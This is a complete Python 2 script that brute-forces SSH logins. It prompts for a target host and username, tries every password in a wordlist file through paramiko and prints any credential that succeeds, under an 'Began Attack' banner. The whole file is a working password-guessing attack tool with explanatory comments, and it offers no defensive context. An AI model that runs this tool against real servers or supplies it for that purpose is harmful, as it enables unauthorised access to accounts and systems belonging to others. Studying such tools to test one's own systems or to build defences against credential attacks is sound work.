#!/usr/bin/env python

import paramiko, sys, os, socket

#Define ssh_connect function in charge of trying to connect to an ssh server using a defined user name and password
def ssh_connect(password, code = 0):

    #Create paramiko ssh client object instance
    ssh = paramiko.SSHClient()
    #Automatically manage new host keys, which will be missing
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        #Try to connect using the specified user name and password
        ssh.connect(host, port=22, username=username, password = password)
    except paramiko.AuthenticationException:
        #Inserted password was wrong. Return 1 at the end of the function
        code = 1
    except socket.error, e:
        #Couldn't connect to the SSH server or other socket problem. Return 2 at the end of the function
        code = 2

    #Independently if connected or not, close the ssh client
    ssh.close()

    return code

#Create globals to be used in the ssh_connect function and later in the program
global host, username, line, input_file

#Define the line variable with a string with 30 hyphens and newlines at the beginning and at the end
line = "\n" + "-"*30 + "\n"

try:
    #Acquire data from the user, who will specify server address and SSH username
    host = raw_input("[*] Enter target host address: ")
    username = raw_input("[*] Enter ssh username: ")
    #input_file = raw_input("[*] Enter SSH Password File: ")
    input_file = "passwordFile.txt"

    #Check if dictionary directory exits
    if os.path.exists(input_file) == False:
        print '\n[*] File path does not exist'
        sys.exit(4)

except KeyboardInterrupt:
    print '\n\n[*] Terminated program'
    sys.exit(3)

#Open password file
input_file = open(input_file)

print '\n\n' + "="*30 + "Began Attack" + "="*30 + "\n"

for i in input_file.readlines():
    #Read passwords line by line, removing their newline characters
    password = i.strip("\n")
    try:
        #Try to connect using prepared password
        response = ssh_connect(password)
        
        #Depending on the return code of ssh_connect, print if password was found, if it was incorrect, or it there was a problem with the socket (such as that the connection could not be established
        if response == 0:
            print("%s[*] User: %s [*] Pass Found: %s%s" % (line, username, password, line))
            sys.exit(0)
        elif response == 1:
            print("[*] User: %s [*] Pass: %s => Login Incorrect !!! <=" % (username, password))
        elif response == 2:
            print("[*] Connection could not be established to address: %s" % (host))
            sys.exit(2)

    except Exception, e:
        print e
        pass

#We are done with the dictionary, so we can close it
input_file.close()
